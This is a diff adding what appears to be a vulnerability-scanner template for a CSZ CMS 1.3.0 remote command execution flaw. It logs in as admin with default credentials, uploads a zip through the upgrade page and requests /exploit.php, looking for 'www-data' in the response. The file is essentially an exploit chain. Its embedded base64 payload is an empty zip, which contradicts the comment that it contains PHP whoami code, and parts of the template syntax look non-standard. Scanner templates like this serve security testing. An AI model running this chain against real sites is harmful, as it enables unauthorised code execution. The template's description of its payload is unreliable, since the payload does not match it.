@@ -1,0 +1,55 @@
+id: CSZ-CMS-RCE-Benign-Test
+
+info:
+  name: CSZ CMS 1.3.0 RCE (Benign Test)
+  author: machevalia
+  severity: medium
+  description: |
+    This template tests for the CSZ CMS 1.3.0 Remote Command Execution vulnerability by uploading a harmless payload and executing a benign command.
+  reference:
+    - https://www.cszcms.com/
+  tags: rce,cms,benign
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/login"
+    body:
+      username=admin@admin.com&password=password&login_submit=Login
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Dashboard"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/upgrade"
+    body:
+      upgrade_file=@data/payload.zip
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/exploit.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "www-data"  # Assuming a typical web server user on Linux
+      - type: status
+        status:
+          - 200
+
+payloads:
+  - name: payload.zip
+    content: |
+      UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==
+      # Base64 encoded benign zip containing PHP code for whoami execution
